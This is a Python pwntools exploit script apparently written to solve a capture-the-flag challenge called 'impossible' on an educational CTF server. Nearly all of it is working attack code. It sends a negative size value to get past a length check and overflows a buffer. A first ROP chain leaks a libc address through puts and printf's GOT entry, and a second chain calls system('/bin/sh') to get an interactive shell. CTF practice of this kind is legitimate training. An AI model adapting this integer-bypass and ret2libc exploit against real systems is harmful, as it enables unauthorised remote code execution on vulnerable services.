from pwn import *

context.log_level = 'DEBUG'
#yen = process('./impossible')
libc = ELF('libc-2.27.so')
yen = remote('eductf.zoolab.org', 10105)

pop_rdi = 0x400873
put_plt = 0x4005b0


printf_got = 0x601020
printf_libc_off = 0x64e80
main = 0x400748

system_off = 0x4f440



size = '-2147483648'
sc = flat(
	'A'*0x100,
	p64(0x400810),
	p64(pop_rdi),
	p64(printf_got),
	p64(put_plt),
	p64(main)
	)

yen.sendlineafter('Size:', size)
yen.recvuntil('It\'s safe now :)')
yen.send(sc)
yen.recvline()

baselibc = u64(yen.recvline()[0:6]+'\0\0') - printf_libc_off
system = baselibc + system_off
success( 'libc -> %s'%hex(baselibc))
bin_sh = baselibc + 0x1b3e9a
daibao = flat(
	'A'*0x100,
	p64(0x400810),
	p64(0x400294),
	p64(pop_rdi),
	p64(bin_sh),
	p64(system)	
	)
yen.sendlineafter('Size:', size)
yen.recvuntil('It\'s safe now :)')
yen.send(daibao)
yen.interactive()
